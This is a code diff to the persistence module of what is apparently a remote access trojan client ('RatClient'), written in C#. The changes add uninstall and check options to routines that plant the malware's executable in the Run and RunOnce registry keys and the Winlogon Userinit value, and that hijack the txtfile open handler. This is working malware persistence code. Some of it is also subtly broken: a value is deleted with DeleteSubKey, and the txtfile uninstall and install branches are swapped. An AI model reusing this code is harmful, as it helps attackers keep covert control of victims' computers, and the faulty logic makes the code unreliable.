@@ -13,7 +13,7 @@ namespace RatClient.Persistence
         private static readonly string logonUserRunOncePath = $@"{Info.UserInfo.userSid}\Software\Microsoft\Windows\CurrentVersion\RunOnce";
         private static readonly string winlogonuserinitPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";
 
-        public static bool RunLocalMachine(string name)
+        public static bool RunLocalMachine(string name, bool unreg = false, bool checker = false)
         {
             bool status = false;
             if (string.IsNullOrEmpty(name))
@@ -24,17 +24,30 @@ namespace RatClient.Persistence
             {
                 using (RegistryKey sub = key.OpenSubKey(localMachineRunPath, true))
                 {
-                    if (sub != null)
-                    {
-                        sub.SetValue(name, exec, RegistryValueKind.String);
-                        status = true;
-                    }
-                }
+					if (sub != null)
+					{
+						if (unreg)
+						{
+							sub.DeleteSubKey(name);
+						}
+						else if (checker)
+						{
+							string current = (string)sub.GetValue(name);
+							status = current == name || current.Contains(exec);
+						}
+						else
+						{
+							sub.SetValue(name, exec, RegistryValueKind.String);
+						}
+						status = true;
+					}
+				}
             }
             return status;
         }
 
-        public static bool RunLogonUser(string name)
+       
+        public static bool RunLogonUser(string name, bool unreg = false, bool checker = false)
         {
             bool status = false;
             if (string.IsNullOrEmpty(name))
@@ -49,8 +62,20 @@ namespace RatClient.Persistence
                     {
                         if (sub != null)
                         {
-                            sub.SetValue(name, exec, RegistryValueKind.String);
-                            status = true;
+                            if (unreg)
+                            {
+                                sub.DeleteSubKey(name);
+                            }
+                            else if (checker)
+                            {
+                                string current = (string)sub.GetValue(name);
+                                status = current == name || current.Contains(exec);
+                            }
+                            else
+                            {
+								sub.SetValue(name, exec, RegistryValueKind.String);
+							}
+							status = true;
                         }
                     }
                 }
@@ -59,7 +84,7 @@ namespace RatClient.Persistence
             return status;
         }
 
-        public static bool WinLogonUserInit()
+        public static bool WinLogonUserInit(bool unreg = false, bool checker = false) 
         {
             bool status = false;
             try
@@ -71,9 +96,23 @@ namespace RatClient.Persistence
                         if (sub != null)
                         {
                             string currentvalue = (string)sub.GetValue("USERINIT");
-                            if (currentvalue != null)
+                            if (checker && currentvalue != null) 
                             {
-                                string value = $"{currentvalue.Split(',')[0].Trim()},{exec}";
+                                status = currentvalue.Contains(exec);
+                            }
+                            else if (currentvalue != null)
+                            {
+                                string value;
+
+								if (unreg)
+                                {
+                                   value = $"{currentvalue.Split(',')[0].Trim()},";
+
+								}
+                                else
+                                {
+									value = $"{currentvalue.Split(',')[0].Trim()},{exec}";
+								}
                                 sub.SetValue("USERINIT", value, RegistryValueKind.String);
                                 status = true;
                             }
@@ -85,7 +124,7 @@ namespace RatClient.Persistence
             return status;
         }
 
-        public static bool PersistTxtfile()
+        public static bool PersistTxtfile(bool unreg = false) 
         {
             if(RegTools.IsPersistTxtfile())
             {
@@ -99,7 +138,16 @@ namespace RatClient.Persistence
                 {
                     if (key != null)
                     {
-                        key.SetValue(null, $"{exec} -ptxt \"%1\"", RegistryValueKind.String);
+                        string value;
+                        if (unreg)
+                        {
+                            value = $"{exec} -ptxt \"%1\"";
+                        }
+                        else
+                        {
+                            value = "C:\\windows\\system32\\notepad.exe \"%1\"";
+						}
+                        key.SetValue(null, value, RegistryValueKind.String);
                         status = true;
                     }
                 }
